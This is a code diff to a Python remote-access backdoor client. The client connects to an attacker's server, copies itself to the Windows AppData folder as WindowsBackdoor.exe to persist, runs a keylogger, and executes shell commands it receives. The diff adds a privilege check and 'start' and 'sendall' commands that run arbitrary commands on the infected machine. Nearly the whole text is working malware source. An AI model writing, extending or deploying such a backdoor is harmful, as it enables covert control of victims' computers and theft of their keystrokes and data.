@@ -5,9 +5,18 @@
     Connect to the server running on attacker machine.
 """
 
-import socket, subprocess, os, sys, threading, shutil, time
+import socket
+import subprocess
+import os
+import sys
+import threading
+import shutil
+import time
+
 import pyautogui
+
 import keylogger
+
 
 def persist():
     file_location = os.environ["appdata"] + "\\WindowsBackdoor.exe"
@@ -20,6 +29,15 @@ def persist():
             s.send("[!] Persistence already exists.")
     except:
         s.send("[-] Unable to create persistence.")
+
+def is_admin():
+    try:
+        temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\Windows"), "temp"]))
+        return True
+    except:
+        return False
+
+
 
 def download_file(filename):
     with open(filename, "wb") as file:
@@ -53,6 +71,8 @@ def shell():
         command = reliable_recv()
         if command == "quit":
             break
+        elif command == "background":
+            pass
         elif command == "help":
             pass
         elif command == "clear":
@@ -87,8 +107,25 @@ def shell():
             t.join()
             s.send("[+] Keylogger stopped")
 
+        elif command == "isadmin":
+            if is_admin():
+                s.send("[+] Administrator privileges")
+            else:
+                s.send("[!!] User privileges.")
+
+        if command[:5] == "start":
+            try:
+                subprocess.Popen(command[6:], shell=True)
+                s.send(f"[+] Successfully started {command[6:]}")
+            except Exception as e:
+                s.send(f"[-] Failed to start {command[6:]}\n{e}")
+
         elif command == "persistence":
             persist()
+
+        elif command[:7] == "sendall":
+            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                       stderr=subprocess.PIPE)
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
